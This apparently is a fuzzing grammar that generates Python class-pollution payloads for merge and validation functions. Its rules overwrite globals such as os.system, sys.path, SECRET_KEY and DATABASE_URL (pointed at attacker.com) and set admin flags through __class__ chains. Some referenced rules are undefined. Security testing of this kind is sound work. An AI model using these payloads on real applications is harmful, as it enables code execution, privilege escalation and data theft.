!root <pollution_input>
!max_depth 6

<pollution_input> = {"merge_fn":<merge_fn>,"payload":<payload>}

<merge_fn> = "recursive_merge"
<merge_fn> = "recursive_merge_filtered"
<merge_fn> = "setattr_loop"
<merge_fn> = "dict_update_recursive"
<merge_fn> = "pydantic_validate"
<merge_fn> = "omegaconf_merge"
<merge_fn> = "attrs_structure"
<merge_fn> = "pyyaml_safe_merge"

<payload> = <globals_chain>
<payload> = <class_attr_chain>
<payload> = <bases_chain>
<payload> = <dict_chain>
<payload> = <shallow_dunder>
<payload> = <nested_chain>

<globals_chain> = {"__class__":{"__init__":{"__globals__":{<globals_target>}}}}
<globals_target> = "os":{"system":"id"}
<globals_target> = "os":{"environ":{"PATH":"/tmp/evil"}}
<globals_target> = "SECRET_KEY":"pwned"
<globals_target> = "DEBUG":true
<globals_target> = "__builtins__":{"eval":"REPLACED"}
<globals_target> = "subprocess":{"call":"REPLACED"}
<globals_target> = "sys":{"path":[".","/tmp/evil"]}
<globals_target> = "config":{"SECRET_KEY":"pwned","DEBUG":true}
<globals_target> = "ALLOWED_HOSTS":["*"]
<globals_target> = "DATABASE_URL":"postgresql://evil:evil@attacker.com/db"
<globals_target> = "MIDDLEWARE":["evil_middleware"]
<globals_target> = "INSTALLED_APPS":["evil_app"]
<globals_target> = "LOGGING":{"handlers":{"evil":{"class":"REPLACED"}}}
<globals_target> = "ctypes":{"cdll":{"LoadLibrary":"evil.so"}}
<globals_target> = "pickle":{"loads":"REPLACED"}
<globals_target> = "importlib":{"import_module":"REPLACED"}

<class_attr_chain> = {"__class__":{<class_target>}}
<class_target> = "admin":true
<class_target> = "is_admin":true
<class_target> = "_is_superuser":true
<class_target> = "role":"admin"
<class_target> = "is_authenticated":true
<class_target> = "debug":true
